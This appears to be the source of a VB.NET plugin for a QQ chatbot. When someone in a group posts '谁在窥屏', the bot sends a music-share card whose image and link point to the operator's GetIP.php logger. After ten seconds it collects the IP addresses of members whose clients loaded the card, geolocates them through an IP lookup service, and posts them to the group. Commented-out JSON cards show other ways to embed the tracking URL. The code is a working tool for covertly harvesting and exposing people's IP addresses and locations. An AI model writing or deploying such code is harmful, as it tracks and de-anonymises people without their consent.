Imports System.IO
Imports System.Net
Imports System.Runtime.InteropServices
Imports System.Text
Imports System.Text.RegularExpressions
Imports System.Threading
Imports System.Web.Script.Serialization
Imports System.Windows.Forms

Module Main

#Region "收到私聊消息"
    Public funRecvicePrivateMsg As RecvicePrivateMsg = New RecvicePrivateMsg(AddressOf RecvicetPrivateMessage)
    <UnmanagedFunctionPointer(CallingConvention.StdCall)>
    Public Delegate Function RecvicePrivateMsg(ByRef sMsg As PrivateMessageEvent) As Integer
    Public Function RecvicetPrivateMessage(ByRef sMsg As PrivateMessageEvent) As Integer
        Dim MessageRandom As New Long
        Dim MessageReq As New UInteger
        If sMsg.SenderQQ <> sMsg.ThisQQ Then

        End If
        Return 0
    End Function
#End Region

#Region "收到群聊消息"
    Public funRecviceGroupMsg As RecviceGroupMsg = New RecviceGroupMsg(AddressOf RecvicetGroupMessage)
    <UnmanagedFunctionPointer(CallingConvention.StdCall)>
    Public Delegate Function RecviceGroupMsg(ByRef sMsg As GroupMessageEvent) As Integer
    Public Function RecvicetGroupMessage(ByRef sMsg As GroupMessageEvent) As Integer

        If sMsg.SenderQQ <> sMsg.ThisQQ Then
            If sMsg.MessageContent = "谁在窥屏" Then

                If File.Exists(IniFilePath) Then
                    Dim Sections = GetAllSections(IniFilePath)
                    If Sections.Count = 0 Then Return 1
                    For Each Section In Sections
                        If Section = "WebAddress" Then
                            Dim KeysList = GetSectionKeyNames(IniFilePath, Section)
                            For Each Key In KeysList
                                If Key.ToString.StartsWith("url=") Then
                                    url = Key.ToString.Replace("url=", "")
                                    If url.Substring(url.Length - 1) <> "/" Then url = url + "/"
                                    Exit For
                                End If
                            Next
                        End If
                    Next
                    'Dim urli = url.Replace("/", "\/") + "GetIP.php?username=" & CLng(DateTime.UtcNow.Subtract(New DateTime(1970, 1, 1)).TotalMilliseconds) & "_" & sMsg.SenderQQ.ToString & "&url=q.qlogo.cn\/headimg_dl?dst_uin=" & sMsg.SenderQQ.ToString & "&spec=100"
                    '可以通过各种卡片设置访问地址
                    'Dim jsonstring As String = "{""app"":""com.tencent.qq.checkin"",""desc"":"""",""view"":""checkIn"",""ver"":""1.0.0.25"",""prompt"":"""",""appID"":"""",""sourceName"":"""",""actionData"":"""",""actionData_A"":"""",""sourceUrl"":""" + url + """,""meta"":{""checkInData"":{""address"":""正在收集10秒内数据"",""cover"":{""height"":0,""url"":""http:\/\/pub.idqqimg.com\/pc\/misc\/files\/20171027\/3019a3beda364716b8803ca600bcca80.jpg"",""width"":0},""desc"":""谁在窥屏"",""hostuin"":1687820006,""id"":""union_15965948261687820006468907615"",""media_type"":0,""qunid"":""468907615"",""rank"":2,""skip_to"":1,""time"":0,""url"":""" + urli + """,""vid"":""""}},""config"":{""forward"":0,""showSender"":1},""text"":"""",""sourceAd"":""""}"
                    'Dim jsonstring2 As String = "{""app"":""com.tencent.miniapp_01"",""desc"":"""",""view"":""notification"",""ver"":""1.0.0.11"",""prompt"":""【个人介绍】"",""appID"":"""",""sourceName"":"""",""actionData"":"""",""actionData_A"":"""",""sourceUrl"":"""",""meta"":{""notification"":{""appInfo"":{""appName"":""查询窥屏IP"",""appType"":4,""appid"":2307907357,""iconUrl"":""" + urli + """},""button"":[{""action"":""" + urli + """,""name"":""进入小程序查看详情""},{""action"":"""",""name"":"" TG""}],""data"":[{""title"":""提示"",""value"":""正在收集10秒内信息...""}],""emphasis_keyword"":"""",""title"":""谁在窥屏""}}} "   'http:\/\/q1.qlogo.cn\/g?b=qq&nk=1691323137&s=100
                    'API.SendGroupJSONMessage(Pinvoke.plugin_key, sMsg.ThisQQ, sMsg.MessageGroupQQ, jsonstring2, False)
                    Dim urli = url + "GetIP.php?username=" & CLng(DateTime.UtcNow.Subtract(New DateTime(1970, 1, 1)).TotalMilliseconds) & "_" & sMsg.SenderQQ.ToString & "&url=q.qlogo.cn\/headimg_dl?dst_uin=" & sMsg.SenderQQ.ToString & "&spec=100"
                    API.ShareMusic(Pinvoke.plugin_key, sMsg.ThisQQ, sMsg.MessageGroupQQ, "谁在窥屏", "正在收集10秒内数据...", "http://q.qlogo.cn/headimg_dl?dst_uin=" & sMsg.ThisQQ.ToString & "&spec=100", urli, urli, 0, 1)
                    System.Threading.Thread.Sleep(10000)
                    GetQQIP(sMsg.MessageGroupQQ, url)
                End If
            End If
        End If
        Return 0
    End Function
#End Region

    Public Sub GetQQIP(szGruopId As Long, url As String)
        Dim IPList As New List(Of String)
        Dim szOldIP As String = ""
        Dim wClient As New System.Net.WebClient
        Try
            Dim results() As String = wClient.DownloadString(url + "DelIP.php?action=FindAll").Split(New String() {vbCr & vbLf, vbLf}, StringSplitOptions.RemoveEmptyEntries)
            For i = 0 To results.Count - 1
                Dim szRes As String = wClient.DownloadString(url + results(i).Trim)
                Debug.Print(szRes)
                If szRes <> "" Then
                    Dim szIP As String = szRes.Split(",")(0)
                    If szOldIP <> szIP Or szOldIP = "" AndAlso szIP.Contains("192.168.") = False Then
                        szOldIP = szRes.Split(",")(0)
                        If IPList.Contains(szIP.Substring(0, szIP.LastIndexOf(".")) & ".***") = False Then IPList.Add(szIP.Substring(0, szIP.LastIndexOf(".")) & ".***" & " " & GetIPAddr(szIP))
                    End If
                End If
            Next
            API.SendGroupMsg(Pinvoke.plugin_key, RobotQQ, szGruopId, vbNewLine + String.Join(vbNewLine, IPList), False)
            Dim result As String = wClient.DownloadString(url + "DelIP.php?action=DelAll")
        Catch ex As Exception
            Debug.Print(ex.ToString)
        End Try
    End Sub
    Public Function GetIPAddr(szIP As String) As String
        Dim szResult As String = ""
        Dim szUrl = "http://ip.360.cn/IPQuery/ipquery?ip=" & szIP
        Dim szReturn As String = ""
        Dim request As HttpWebRequest = WebRequest.Create(szUrl)
        request.KeepAlive = True
        request.ContentType = "application/json"
        request.Accept = "application/json"
        'request.Headers.Add("Cookie", szCookies)
        request.UserAgent = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
        request.Referer = "http://ip.360.cn"
        request.Method = "GET"
        Try
            Using myResponse As HttpWebResponse = request.GetResponse()
                Using stream As Stream = request.GetResponse().GetResponseStream()
                    Using reader As New StreamReader(stream)
                        szReturn = reader.ReadToEnd()
                        reader.Close()
                    End Using
                    stream.Close()
                End Using
            End Using
        Catch ex As Exception
            Debug.Print(ex.ToString)
        End Try
        If szReturn = "" Then
            Return szResult
        End If
        Try
            Dim jsons As Object = New JavaScriptSerializer().DeserializeObject(szReturn)
            If jsons("errno").ToString <> "0" Then Return szResult : Exit Function
            szResult = jsons("data").ToString.Replace("\t", "")
        Catch ex As Exception
            Debug.Print(ex.ToString)
        End Try
        Return szResult
    End Function
End Module
